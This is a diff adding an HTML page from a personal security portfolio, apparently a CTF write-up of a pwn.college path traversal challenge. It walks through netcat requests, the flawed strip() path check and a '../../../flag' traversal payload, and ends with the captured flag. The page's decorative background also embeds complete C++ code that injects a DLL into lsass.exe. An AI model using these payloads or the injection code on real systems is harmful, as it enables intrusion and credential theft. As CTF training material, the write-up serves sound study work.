@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🕵️‍♂️ Challenge: Path Traversal 2</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🕵️‍♂️ Challenge: Path Traversal 2" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🕵️‍♂️ Challenge: Path Traversal 2</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Category</strong>: Web Security<br />
+<strong>Platform</strong>: pwn.college<br />
+<strong>Level</strong>: Intermediate<br />
+<strong>Vulnerability</strong>: Path Traversal<br />
+<strong>Goal</strong>: Read the <code class="language-plaintext highlighter-rouge">flag</code> file by bypassing directory restrictions.</p>
+
+<hr />
+
+<h2 id="-description">🧩 Description</h2>
+
+<p>We’re given a Flask web app with endpoints at <code class="language-plaintext highlighter-rouge">/data</code> and <code class="language-plaintext highlighter-rouge">/data/&lt;path&gt;</code>, which serve files from the <code class="language-plaintext highlighter-rouge">/challenge/files/</code> directory. Our goal is to access the <code class="language-plaintext highlighter-rouge">flag</code> file located outside this directory.</p>
+
+<hr />
+
+<h2 id="-recon">🔎 Recon</h2>
+
+<h3 id="step-1-basic-get-request">Step 1: Basic GET request</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /data HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>Response:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Returns the content of index.html and lists available fortune files.
+</code></pre></div></div>
+<p>The endpoint works and hints at the existence of deeper files inside /files/fortunes.</p>
+
+<hr />
+
+<h2 id="-vulnerability-insight">🧠 Vulnerability Insight</h2>
+<p>The server code builds file paths like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>requested_path <span class="o">=</span> app.root_path + <span class="s2">"/files/"</span> + path.strip<span class="o">(</span><span class="s2">"/."</span><span class="o">)</span>
+</code></pre></div></div>
+<p>The bug is in the use of .strip(“/.”). It removes only leading/trailing slashes and dots, but not sequences like ../../../. So, path traversal is still possible!
+—</p>
+
+<h2 id="exploiting-path-traversal">Exploiting Path Traversal</h2>
+
+<h3 id="step-2-attempt-to-access-directory-fails">Step 2: Attempt to access directory (Fails)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /data/fortunes HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>This returns a 500 error — probably because it’s trying to read a directory, not a file.</p>
+
+<h3 id="step-3-path-traversal-to-access-flag">Step 3: Path traversal to access flag</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /data/fortunes/../../../flag HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>Success! This bypasses the file restriction and accesses the flag.</p>
+
+<p>Response:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
